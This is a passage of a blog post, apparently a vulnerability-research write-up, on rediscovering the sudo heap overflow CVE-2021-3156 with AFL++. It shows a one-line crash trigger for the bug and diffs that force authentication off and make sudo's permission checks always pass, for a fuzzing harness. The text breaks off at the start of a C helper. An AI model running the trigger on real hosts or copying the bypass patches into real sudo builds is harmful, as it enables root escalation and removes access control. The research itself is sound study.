<!doctype html><html lang=en><head><meta name=viewport content="width=device-width"><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=7"><link rel=icon href=/cyberpunk-cat32x32.png><link rel="shortcut icon" href=/cyberpunk-cat32x32.ico type=image/x-icon><link rel=apple-touch-icon href=/cyberpunk-cat180x180.png><title>Down the modern sudoedit rabbit hole - CVE-2021-3156 &ndash;
Nikolaos Chalkiadakis
</title><link href=/symbols-nerd-font/symbols-nerd-font.css rel=stylesheet integrity="sha512-lydow8GLOLlYNOtHlksNCmGWWCBsbIEtikXpHzfWqx78HLlyQZHOzyLwPpKol4Th6aCwLUXOfODVYgwrd3nwKQ=="><link href=/jetbrains-mono/jetbrains-mono.css rel=stylesheet integrity="sha512-tJxlgL6v1Y7kFf+qB8SloaAMKnOAw6WouknxXtIjkBux9Y/9aX81EUWOJO8c/3l98DmjG8brr4to7zaez606Fg=="><link type=text/css rel=stylesheet href=https://chalkiadakis.me/css/styles.d9bb6446855e3e95409ba61aaf08c0b870eafc96a718853c9b9454c0b340e0735bcc9e6542ef9aa75d1aa9983fab319a53cc9997170c5d05032ff5d229a4cb9f.css integrity="sha512-2btkRoVePpVAm6YarwjAuHDq/JanGIU8m5RUwLNA4HNbzJ5lQu+ap10aqZg/qzGaU8yZlxcMXQUDL/XSKaTLnw=="><script type=text/javascript src=/fontawesome/all.min.js></script><meta name=author content="Nikolaos Chalkiadakis"><meta name=keywords content='CVE,fuzzing,vulnerability research'><meta name=description content="n more about fuzzing&amp;hellip;"><meta property="og:site_name" content='Nikolaos Chalkiadakis'><meta property="og:title" content="Down the modern sudoedit rabbit hole - CVE-2021-3156"><meta property="og:type" content="article"><meta property="article:author" content="Nikolaos Chalkiadakis"><meta property="article:published_time" content='2024-04-26T00:00:01Z+0000'><meta property="article:tag" content="CVE"><meta property="article:tag" content="fuzzing"><meta property="article:tag" content="vulnerability research"><meta property="og:url" content="https://chalkiadakis.me/posts/cve-2021-3156/cve-2021-3156/"><meta property="og:image" content="https://chalkiadakis.me/post-resources/CVE-2021-3156/images/rabbit.png"><meta property="og:description" content="On a journey to learn more about fuzzing&amp;hellip;"><meta name=twitter:card content="summary_large_image"><meta property="twitter:domain" content='chalkiadakis.me'><meta property="twitter:url" content="https://chalkiadakis.me/posts/cve-2021-3156/cve-2021-3156/"><meta name=twitter:title content="Down the modern sudoedit rabbit hole - CVE-2021-3156"><meta name=twitter:image content="https://chalkiadakis.me/post-resources/CVE-2021-3156/images/rabbit.png"><meta name=twitter:description content="On a journey to learn more about fuzzing&amp;hellip;"><link rel=manifest href=/manifest/index.json></head><body><div id=baseContainer><header><div class=titleAndSearchContainer><div id=titleContainer><a class=unstyledLink href=/><img src=/cyberpunk-cat512x512.png alt=Logo></a><div class=rightOfLogo><div class=titleAndHamburger><h1><a class=unstyledLink href=/>Nikolaos Chalkiadakis</a></h1></div><div id=wide_nav><nav><ul id=main-nav><li><a href=/>Home</a></li><li><a href=/posts>Posts</a></li><li><a href=/whoami/>whoami</a></li><li><a href=/tags>Tags</a></li></ul></nav></div></div></div><div class=search><input id=searchbar type=text placeholder=Search>
<a class=nerdlink onclick=newSearch()>&#xf002;</a></div><script>function newSearch(){let e=searchbar.value.trim();if(!e)return;location.href=`/search?q=${e}`}searchbar.onkeyup=e=>{e.keyCode==13&&newSearch()}</script></div><div id=links><a rel=noreferrer target=_blank class=nerdlink href=https://github.com/nikosChalk>&#xf09b;
<span>GitHub
</span></a><a rel=noreferrer target=_blank class=nerdlink href=https://www.linkedin.com/in/chalkn>&#xf0e1;
<span>LinkedIn
</span></a><a rel=noreferrer target=_blank class=nerdlink href=https://ctftime.org/user/128082><img src=/ctf-timefavicon.png width=14px>
<span>CTFTime</span></a></div></header><div id=contentContainer><div id=content><main><article class="card single"><h1>Down the modern sudoedit rabbit hole - CVE-2021-3156</h1><p class=date><span title=Date>ï—¬ </span>2024, April 26</p><div class=articleToc style=display:flex><div><nav id=TableOfContents><ul><li><a href=#environment-setup>Environment setup</a></li><li><a href=#fuzzing>Fuzzing</a><ul><li><a href=#modfying-sudo-to-facilitate-fuzzing>Modfying <code>sudo</code> to facilitate fuzzing</a></li><li><a href=#compiling-sudo-with-afl>Compiling <code>sudo</code> with AFL++</a></li><li><a href=#seed-corpus>Seed corpus</a></li><li><a href=#running-afl>Running AFL++</a></li><li><a href=#triaging-crashes>Triaging crashes</a><ul><li><a href=#afl-exploration-mode>AFL++ exploration mode</a></li></ul></li><li><a href=#minimal-crash-poc>Minimal crash PoC</a></li><li><a href=#root-cause-analysis>Root cause analysis</a></li><li><a href=#further-analysis>Further analysis</a></li></ul></li><li><a href=#exploitation>Exploitation</a><ul><li><a href=#exploitation-strategy>Exploitation strategy</a></li><li><a href=#identifying-inputs>Identifying inputs</a></li><li><a href=#writing-a-heap-feng-shui-fuzzer>Writing a heap feng shui fuzzer</a></li><li><a href=#auto-analyzing-crashes>Auto-analyzing crashes</a></li><li><a href=#manual-triaging>Manual triaging</a></li><li><a href=#exploit-development>Exploit development</a></li><li><a href=#pitfalls-and-hard-reality>Pitfalls and hard reality</a></li></ul></li><li><a href=#conclusion>Conclusion</a></li></ul></nav></div><div style=flex:1><figure style=margin:0><img src=/post-resources/CVE-2021-3156/images/rabbit.png alt></figure></div></div><hr><div><p>So, here we depart with <a href=https://nvd.nist.gov/vuln/detail/CVE-2021-3156 target=_blank rel="noopener noreferrer">CVE-2021-3156</a>. This is a vulnerability in the <code>sudo</code> program that allows privilege escalation. This post is about my personal journey (and notes to my future self) to learn a bit more about fuzzing binaries by rediscovering this vulnerability and then attempting to exploit it. We will work with AFL++ as our main choice of fuzzer. Throughout this process, I followed along the <a href="https://www.youtube.com/playlist?list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx" target=_blank rel="noopener noreferrer">sudo playlist from LiveOverflow</a> in order to steer me towards the correct direction.</p><h2 id=environment-setup>Environment setup</h2><p>We start by setting up a <a href=https://github.com/nikosChalk/nikosChalk.github.io/tree/master/static/post-resources/CVE-2021-3156/Dockerfile target=_blank rel="noopener noreferrer">Docker container</a> where we will do our vulnerability research. We install AFL++ and other debugging tools. As for a vulnerable <code>sudo</code>, we will fetch its source to our host machine and mount it to the docker image so that we can easily apply modifications.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>wget https://www.sudo.ws/dist/sudo-1.8.31p2.tar.gz <span style=color:#f92672>&amp;&amp;</span> <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>    tar -xvf sudo-1.8.31p2.tar.gz
</span></span></code></pre></div><p>We wrap all the Docker commands in a <a href=https://github.com/nikosChalk/nikosChalk.github.io/tree/master/static/post-resources/CVE-2021-3156/Makefile target=_blank rel="noopener noreferrer">Makefile</a> for convenience.</p><p>Next we spin up our docker image, build <code>sudo</code> from source code using our <a href=https://github.com/nikosChalk/nikosChalk.github.io/tree/master/static/post-resources/CVE-2021-3156/sudo-build.sh target=_blank rel="noopener noreferrer">build script wrapper</a>, and verify that it is indeed a vulnerable version:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>user:~$ bash -c <span style=color:#e6db74>&#39;exec -a sudoedit /usr/local/bin/sudo-original -s AAA\\&#39;</span>
</span></span><span style=display:flex><span>malloc<span style=color:#f92672>()</span>: invalid next size <span style=color:#f92672>(</span>unsorted<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Aborted
</span></span></code></pre></div><p>Great, we have our test setup. Let&rsquo;s move to fuzzing.</p><h2 id=fuzzing>Fuzzing</h2><p>For fuzzing, we will use AFL++. Here are some peculiarities regarding our fuzzing setup:</p><ul><li>We want to fuzz <code>argv</code> in order to be able to discover the bug. AFL++ is designed to fuzz input files.</li><li>Our binary is <code>suid</code>. Under normal circumstances we invoke it as <code>uid=1000(user)</code> and the binary runs as <code>uid=0(root)</code>. These binaries cannot be debugged in <code>gdb</code>, unless you are root. <code>sudo</code> has different behavior and code paths if you are <code>root</code> or regular <code>user</code>.</li></ul><p>To fuzz <code>argv</code>, we will use <a href=https://github.com/AFLplusplus/AFLplusplus/blob/stable/utils/argv_fuzzing/argv-fuzz-inl.h target=_blank rel="noopener noreferrer">argv_fuzzing/argv-fuzz-inl.h</a> from AFL++ source code. This is a header that you include and the program&rsquo;s <code>argv</code> will be read from <code>stdin</code> and replace the old <code>argv</code>. This can also fuzz <code>argv[0]</code> which is required to discover CVE-2021-3156, as <code>sudoedit</code> must be ran and not <code>sudo</code>.</p><p>Regarding the suid case, we do not have any problem. AFL++ builds <code>sudo</code> from source code and applies compile-time instrumentation passes. It does not rely at runtime on <code>ptrace</code> operations, so it can work with suid binaries.</p><h3 id=modfying-sudo-to-facilitate-fuzzing>Modfying <code>sudo</code> to facilitate fuzzing</h3><p>First, let&rsquo;s modify sudo to facilitate <code>argv</code> fuzzing:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-diff data-lang=diff><span style=display:flex><span>diff --git a/src/sudo.c b/src/sudo.c
</span></span><span style=display:flex><span>index c6d8f62..6e30c9b 100644
</span></span><span style=display:flex><span><span style=color:#f92672>--- a/src/sudo.c
</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+++ b/src/sudo.c
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span><span style=color:#75715e>@@ -69,6 +69,10 @@
</span></span></span><span style=display:flex><span><span style=color:#75715e></span> #include &#34;sudo_plugin.h&#34;
</span></span><span style=display:flex><span> #include &#34;sudo_plugin_int.h&#34;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>+#ifdef AFL_ARGV
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+#include &#34;/home/user/AFLplusplus/utils/argv_fuzzing/argv-fuzz-inl.h&#34;
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+#endif
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span> /*
</span></span><span style=display:flex><span>  * Local variables
</span></span><span style=display:flex><span>  */
</span></span><span style=display:flex><span><span style=color:#75715e>@@ -134,6 +138,40 @@ __dso_public int main(int argc, char *argv[], char *envp[]);
</span></span></span><span style=display:flex><span><span style=color:#75715e></span> int
</span></span><span style=display:flex><span> main(int argc, char *argv[], char *envp[])
</span></span><span style=display:flex><span> {
</span></span><span style=display:flex><span><span style=color:#a6e22e>+     printf(&#34;before\n&#34;);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+     printf(&#34;argc=%d\n&#34;, argc);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+     for(int i=0; i&lt;argc; i++) {
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+             printf(&#34;argv[%d]=%s\n&#34;, i, argv[i]);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+     }
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+ #ifdef HAVE___PROGNAME
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+     extern const char *__progname;
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+     printf(&#34;__progname=%s\n&#34;, __progname);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+ #endif
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+#ifdef AFL_ARGV
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+       AFL_INIT_ARGV();
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+       printf(&#34;after:\n&#34;);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+#endif
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+       printf(&#34;argc=%d\n&#34;, argc);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+       for(int i=0; i&lt;argc; i++) {
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+               printf(&#34;argv[%d]=%s\n&#34;, i, argv[i]);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+       }
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+       printf(&#34;envp:\n&#34;);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+       for(int i=0; envp[i]; i++) {
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+               printf(&#34;envp[%02d]=%s\n&#34;, i, envp[i]);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+       }
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+#ifdef HAVE___PROGNAME
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    extern const char *__progname;
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+       __progname = argv[0];
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+#endif
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+       printf(&#34;__progname=%s\n&#34;, __progname);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span>     int nargc, ok, status = 0;
</span></span><span style=display:flex><span>     char **nargv, **env_add;
</span></span><span style=display:flex><span>     char **user_info, **command_info, **argv_out, **user_env_out;
</span></span></code></pre></div><p>As you can see, we need to also set <code>__progname</code> as it is used by <code>sudo</code>. When we change <code>argv[0]</code>, the <code>__progname</code> needs to be manually updated.</p><p>Another quirk of <code>sudo</code> is that it asks for a password and we do not want to input any. But AFL++ will hang if we do not fix this. We apply a patch to <code>sudo</code> which disables authentication. This will also allow the fuzzer to progress further, potentially triggering crashes caused by earlier memory corruptions.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-diff data-lang=diff><span style=display:flex><span>diff --git a/plugins/sudoers/defaults.c b/plugins/sudoers/defaults.c
</span></span><span style=display:flex><span>index 2055f6e..43be816 100644
</span></span><span style=display:flex><span><span style=color:#f92672>--- a/plugins/sudoers/defaults.c
</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+++ b/plugins/sudoers/defaults.c
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span><span style=color:#75715e>@@ -518,6 +518,7 @@ init_defaults(void)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span> #ifndef NO_AUTHENTICATION
</span></span><span style=display:flex><span>     def_authenticate = true;
</span></span><span style=display:flex><span> #endif
</span></span><span style=display:flex><span><span style=color:#a6e22e>+def_authenticate = false;
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span> #ifndef NO_ROOT_SUDO
</span></span><span style=display:flex><span>     def_root_sudo = true;
</span></span><span style=display:flex><span> #endif
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>diff --git a/plugins/sudoers/check.c b/plugins/sudoers/check.c
</span></span><span style=display:flex><span>index 3a18e0c..0d8ed13 100644
</span></span><span style=display:flex><span><span style=color:#f92672>--- a/plugins/sudoers/check.c
</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+++ b/plugins/sudoers/check.c
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span><span style=color:#75715e>@@ -183,7 +183,7 @@ check_user(int validated, int mode)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      * If the user is not changing uid/gid, no need for a password.
</span></span><span style=display:flex><span>      */
</span></span><span style=display:flex><span>     if (!def_authenticate || user_is_exempt()) {
</span></span><span style=display:flex><span><span style=color:#f92672>-       sudo_debug_printf(SUDO_DEBUG_INFO, &#34;%s: %s&#34;, __func__,
</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+       fprintf(stderr, &#34;%s: %s\n&#34;, __func__,
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span>            !def_authenticate ? &#34;authentication disabled&#34; :
</span></span><span style=display:flex><span>            &#34;user exempt from authentication&#34;);
</span></span><span style=display:flex><span>        exempt = true;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>diff --git a/plugins/sudoers/parse.c b/plugins/sudoers/parse.c
</span></span><span style=display:flex><span>index c44f5fe..5c1ad64 100644
</span></span><span style=display:flex><span><span style=color:#f92672>--- a/plugins/sudoers/parse.c
</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+++ b/plugins/sudoers/parse.c
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span><span style=color:#75715e>@@ -106,8 +106,9 @@ sudoers_lookup_pseudo(struct sudo_nss_list *snl, struct passwd *pw,
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>     }
</span></span><span style=display:flex><span><span style=color:#a6e22e>+       /*
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span>     if (match == ALLOW || user_uid == 0) {
</span></span><span style=display:flex><span><span style=color:#f92672>-       /* User has an entry for this host. */
</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+       // User has an entry for this host.
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span>        SET(validated, VALIDATE_SUCCESS);
</span></span><span style=display:flex><span>     } else if (match == DENY)
</span></span><span style=display:flex><span>        SET(validated, VALIDATE_FAILURE);
</span></span><span style=display:flex><span><span style=color:#75715e>@@ -115,6 +116,9 @@ sudoers_lookup_pseudo(struct sudo_nss_list *snl, struct passwd *pw,
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        SET(validated, FLAG_CHECK_USER);
</span></span><span style=display:flex><span>     else if (nopass == true)
</span></span><span style=display:flex><span>        def_authenticate = false;
</span></span><span style=display:flex><span><span style=color:#a6e22e>+       */
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+       fprintf(stderr, &#34;sudoers_lookup_pseudo forced VALIDATE_SUCCESS\n&#34;);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+       SET(validated, VALIDATE_SUCCESS);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span>     debug_return_int(validated);
</span></span><span style=display:flex><span> }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>@@ -178,7 +182,9 @@ sudoers_lookup_check(struct sudo_nss *nss, struct passwd *pw,
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>     }
</span></span><span style=display:flex><span><span style=color:#f92672>-    debug_return_int(UNSPEC);
</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+    // debug_return_int(UNSPEC);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    fprintf(stderr, &#34;sudoers_lookup_check forced ALLOW\n&#34;);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    debug_return_int(ALLOW);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span> }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> /*
</span></span></code></pre></div><p>We also prevent <code>sudo</code> from running arbitrary commands by patching out that functionality and replacing it with an always-success return value instead. Since we prevent sudo from doing fork+execve, this will significantly increase AFL++ fuzzing speed:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-diff data-lang=diff><span style=display:flex><span>diff --git a/src/sudo_edit.c b/src/sudo_edit.c
</span></span><span style=display:flex><span>index c79501d..7a33529 100644
</span></span><span style=display:flex><span><span style=color:#f92672>--- a/src/sudo_edit.c
</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+++ b/src/sudo_edit.c
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span><span style=color:#75715e>@@ -577,6 +577,7 @@ sudo_edit_create_tfiles(struct command_details *command_details,
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        rc = -1;
</span></span><span style=display:flex><span>        switch_user(command_details-&gt;euid, command_details-&gt;egid,
</span></span><span style=display:flex><span>            command_details-&gt;ngroups, command_details-&gt;groups);
</span></span><span style=display:flex><span><span style=color:#a6e22e>+       fprintf(stderr, &#34;Editing file %s\n&#34;, files[i]);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span>        ofd = sudo_edit_open(files[i], O_RDONLY,
</span></span><span style=display:flex><span>            S_IRUSR|S_IWUSR|S_IRGRP|S_IROTH, command_details);
</span></span><span style=display:flex><span>        if (ofd != -1 || errno == ENOENT) {
</span></span><span style=display:flex><span><span style=color:#75715e>@@ -1059,7 +1060,10 @@ sudo_edit(struct command_details *command_details)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>     command_details-&gt;ngroups = user_details.ngroups;
</span></span><span style=display:flex><span>     command_details-&gt;groups = user_details.groups;
</span></span><span style=display:flex><span>     command_details-&gt;argv = nargv;
</span></span><span style=display:flex><span><span style=color:#f92672>-    rc = run_command(command_details);
</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+    // rc = run_command(command_details);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    // fprintf(stderr, &#34;rc=%d\n&#34;, rc);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    rc = 0;
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    fprintf(stderr, &#34;Command %s skipped. rc emulated to SUCCESS (0)\n&#34;, command_details-&gt;argv[0]);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span>     if (sudo_gettime_real(&amp;times[1]) == -1) {
</span></span><span style=display:flex><span>        sudo_warn(U_(&#34;unable to read the clock&#34;));
</span></span><span style=display:flex><span>        goto cleanup;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>diff --git a/src/exec.c b/src/exec.c
</span></span><span style=display:flex><span>index 4640082..c3eb8c4 100644
</span></span><span style=display:flex><span><span style=color:#f92672>--- a/src/exec.c
</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+++ b/src/exec.c
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span><span style=color:#75715e>@@ -348,6 +348,10 @@ int
</span></span></span><span style=display:flex><span><span style=color:#75715e></span> sudo_execute(struct command_details *details, struct command_status *cstat)
</span></span><span style=display:flex><span> {
</span></span><span style=display:flex><span>     debug_decl(sudo_execute, SUDO_DEBUG_EXEC)
</span></span><span style=display:flex><span><span style=color:#a6e22e>+    debug_return_int(0);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span>
</span></span><span style=display:flex><span>     /* If running in background mode, fork and exit. */
</span></span><span style=display:flex><span>     if (ISSET(details-&gt;flags, CD_BACKGROUND)) {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>diff --git a/plugins/sudoers/visudo.c b/plugins/sudoers/visudo.c
</span></span><span style=display:flex><span>index 308c08d..8d48786 100644
</span></span><span style=display:flex><span><span style=color:#f92672>--- a/plugins/sudoers/visudo.c
</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+++ b/plugins/sudoers/visudo.c
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span><span style=color:#75715e>@@ -861,6 +861,10 @@ run_command(char *path, char **argv)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>     int status;
</span></span><span style=display:flex><span>     pid_t pid, rv;
</span></span><span style=display:flex><span>     debug_decl(run_command, SUDOERS_DEBUG_UTIL)
</span></span><span style=display:flex><span><span style=color:#a6e22e>+    debug_return_int(0);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span>
</span></span><span style=display:flex><span>     switch (pid = sudo_debug_fork()) {
</span></span><span style=display:flex><span>        case -1:
</span></span></code></pre></div><h3 id=compiling-sudo-with-afl>Compiling <code>sudo</code> with AFL++</h3><p>Next, we have to compile our <code>sudo</code> code base with AFL++ instrumentation.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>CC<span style=color:#f92672>=</span>afl-clang-fast CXX<span style=color:#f92672>=</span>afl-clang-fast++ CPPFLAGS<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;-DAFL_ARGV&#34;</span> <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>    ./configure --disable-shared
</span></span><span style=display:flex><span>make clean <span style=color:#f92672>&amp;&amp;</span> make
</span></span><span style=display:flex><span>make install
</span></span><span style=display:flex><span>cp /usr/local/bin/sudo /usr/local/bin/sudo-afl
</span></span><span style=display:flex><span>chmod +s /usr/local/bin/sudo-afl
</span></span></code></pre></div><p>We use <a href=https://github.com/AFLplusplus/AFLplusplus/blob/stable/instrumentation/README.llvm.md target=_blank rel="noopener noreferrer">AFL++ LLVM Mode</a> since our target is not compiled by default with LTO. The #1 rule when instrumenting a target is: <strong>avoid instrumenting shared libraries at all cost</strong>. Always compile libraries you want to have instrumented as static and link these to the target program! (You could also accidentally type &ldquo;make install&rdquo; and install them system wide - so don&rsquo;t!). That&rsquo;s why we use <code>--disable-shared</code>. This will also help triaging crashes. The <code>AFL_ARGV</code> that we pass to the preprocessor is the macro that we introduced with out code patches earlier.</p><h3 id=seed-corpus>Seed corpus</h3><p>To run AFL++ we also need to have some seed input from which AFL++ will derive the next states. We could give AFL++ already the crashing input but that would be cheating. The best approach here is to give AFL++ inputs that showcase all the possible arguments that <code>sudo</code> accepts. We should also include <code>sudoedit</code> in our seed, otherwise AFL++ will need a lot of time until it discovers it. For example:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo ls
</span></span><span style=display:flex><span>sudoedit -h
</span></span><span style=display:flex><span>sudoedit -p foobar
</span></span></code></pre></div><p>By running <code>sudo -h</code> and <code>sudoedit -h</code> we can see all possible arguments. I was lazy and used very trashy seed (please don&rsquo;t be lazy):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>echo -en <span style=color:#e6db74>&#39;sudoedit\x00-h\x00\x00&#39;</span>           &gt; inputs-sudoedit/1
</span></span><span style=display:flex><span>echo -en <span style=color:#e6db74>&#39;sudoedit\x00-p\x00foobar\x00\x00&#39;</span> &gt; inputs-sudoedit/2
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>user:~/mount/sudoedit$ xxd -g <span style=color:#ae81ff>1</span> inputs-sudoedit/1
</span></span><span style=display:flex><span>00000000: <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>75</span> <span style=color:#ae81ff>64</span> 6f <span style=color:#ae81ff>65</span> <span style=color:#ae81ff>64</span> <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>74</span> <span style=color:#ae81ff>00</span> 2d <span style=color:#ae81ff>68</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>           sudoedit.-h..
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>user:~/mount/sudoedit$ xxd -g <span style=color:#ae81ff>1</span> inputs-sudoedit/2
</span></span><span style=display:flex><span>00000000: <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>75</span> <span style=color:#ae81ff>64</span> 6f <span style=color:#ae81ff>65</span> <span style=color:#ae81ff>64</span> <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>74</span> <span style=color:#ae81ff>00</span> 2d <span style=color:#ae81ff>70</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>66</span> 6f 6f <span style=color:#ae81ff>62</span>  sudoedit.-p.foob
</span></span><span style=display:flex><span>00000010: <span style=color:#ae81ff>61</span> <span style=color:#ae81ff>72</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>                                      ar..
</span></span></code></pre></div><p>As you can see, each argument is separated by a NULL byte, as specified in <a href=https://github.com/AFLplusplus/AFLplusplus/blob/stable/utils/argv_fuzzing/argv-fuzz-inl.h#L24 target=_blank rel="noopener noreferrer">argv-fuzz-inl.h#L24</a>. If you have many seed inputs, you can minimize them with <code>afl-cmin</code>. Redundant inputs that do not trigger different execution paths are discarded in this way.</p><p>Since these arguments are NULL terminated and cannot be fed to regular programs, I created a <a href=https://github.com/nikosChalk/nikosChalk.github.io/tree/master/static/post-resources/CVE-2021-3156/afl-argv-converter/main.c target=_blank rel="noopener noreferrer">helper program</a> that converts the above format of arguments to regular argv parameters. In that way we can also invoke the non-AFL sudo with the same arguments. The converter program is shown below:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#define _GNU_SOURCE
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&#34;argv-fuzz-inl.h&#34;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>/**
